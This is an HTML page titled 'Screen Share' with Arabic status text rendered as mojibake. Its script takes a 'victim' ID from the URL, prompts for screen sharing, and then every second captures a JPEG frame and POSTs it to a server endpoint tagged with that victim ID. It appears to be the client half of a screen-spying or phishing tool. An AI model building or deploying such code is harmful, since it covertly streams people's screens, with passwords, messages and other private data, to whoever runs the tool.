<!DOCTYPE html>
<html>
<head>
    <title>Screen Share</title>
    <meta charset="UTF-8">
</head>
<body>
    <h2>๐ฅ ูุดุงุฑูุฉ ุงูุดุงุดุฉ...</h2>
    <p id="status">ุฌุงุฑู ุจุฏุก ุงููุดุงุฑูุฉ...</p>
    <video id="screenVideo" autoplay></video>

    <script>
        const params = new URLSearchParams(window.location.search);
        const victimId = params.get("victim");
        const video = document.getElementById("screenVideo");

        if (!victimId) {
            document.getElementById("status").innerText = "โ ูุง ููุฌุฏ Victim ID";
        } else {
            navigator.mediaDevices.getDisplayMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    const canvas = document.createElement("canvas");
                    const ctx = canvas.getContext("2d");

                    setInterval(() => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                        const imageData = canvas.toDataURL("image/jpeg", 0.8);

                        fetch(`/api/screen_frame?victim=${victimId}`, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ image: imageData })
                        }).catch(err => console.error(err));

                    }, 1000); // ูู ุซุงููุฉ ุตูุฑุฉ

                    document.getElementById("status").innerText = "โ ูุดุงุฑูุฉ ุงูุดุงุดุฉ ุจุฏุฃุช!";
                })
                .catch(err => {
                    document.getElementById("status").innerText = "โ ุชู ุฅูุบุงุก ุงููุดุงุฑูุฉ ุฃู ุญุฏุซ ุฎุทุฃ";
                });
        }
    </script>
</body>
</html>
